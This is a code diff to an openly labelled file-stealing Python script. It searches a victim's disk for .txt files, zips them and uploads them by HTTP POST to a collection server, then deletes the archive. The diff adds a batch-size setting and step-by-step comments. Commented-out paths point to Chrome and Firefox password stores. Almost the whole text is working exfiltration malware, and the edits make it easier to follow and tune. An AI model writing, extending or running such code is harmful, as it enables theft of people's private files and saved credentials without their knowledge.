@@ -8,7 +8,7 @@ from secrets import token_hex
 
 URL = 'http://127.0.0.1:8000' # the URL/IP to which you want to send the stolen files/information to
 ZIP_URL = 'http://127.0.0.1:8000/zip'
-INTERVAL = 3.0 # Interval between sending files (in seconds). Don't make this too low because you're going to DDOS yourself.
+AMOUNT_TO_SEND = 500.0 # How many files you want to send each time
 USERNAME = os.getlogin()
 #GOOGLE_PASSWORDS = f'C:\\Users\\{USERNAME}\AppData\Local\Google\Chrome\\User Data\Default' # location of Google passwords
 #FIREFOX_PASSWORDS = f'C:\\Users\\{USERNAME}\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json' # location of Firefox passwords
@@ -27,21 +27,21 @@ def file_search():
             if '.txt' in file: # check file type
                 #print(dir + '\\' + file) # for debugging
                 files_found.append([dir + '\\' + file]) # log the found file's address
-            if len(files_found) > 100:
+            if len(files_found) > AMOUNT_TO_SEND:
                 threading.Thread(target=steal_zipped_files()) # run the file stealing mechanism in the background
 
 def steal_zipped_files():
     count = len(files_found) # Assume new files were added which you haven't sent yet and log how many you're sending so you know how many to remove later
     zip_name = make_zip() # make the zip with all its files and save its name
-    with open(zip_name, 'rb') as zip:
-        zip_file = {'file':(zip_name, zip, 'application/zip')}
-        r = requests.post(ZIP_URL, files=zip_file)
+    with open(zip_name, 'rb') as zip: # open the zip file in bytes so it can be sent properly
+        zip_file = {'file':(zip_name, zip, 'application/zip')} # make the payload
+        r = requests.post(ZIP_URL, files=zip_file) # send the zip file
         if not 300 > r.status_code >= 200:
             pass
         else:
-            zip.close()
-            os.remove(zip_name)
-            del files_found[:count]
+            zip.close() # close the zip file so it can be deleted properly
+            os.remove(zip_name) # delete the zip file so you don't have a bunch sitting around
+            del files_found[:count] # remove any files already sent from the list of files to be sent
 
 def steal_files(): # steal files (Non-zipped version, zipped version is default)
     count = len(files_found) # Assume new files were added which you haven't sent yet and log how many you're sending so you know how many to remove later
@@ -61,10 +61,9 @@ def steal_files(): # steal files (Non-zipped version, zipped version is default)
 
 def make_zip():
     zip_name = f'{token_hex(64)}.zip' # give every zip a random name so you don't get errors due to a zip file being open when you're trying to delete it
-    print(f'Zipping {zip_name}')
-    with ZipFile(zip_name, 'w') as zip:
+    with ZipFile(zip_name, 'w') as zip: # open zip file
         for file in files_found:
-            zip.write(file[0], arcname=os.path.basename(file[0]))
+            zip.write(file[0], arcname=os.path.basename(file[0])) # put all the files in the zip
     return zip_name
 
 file_search()
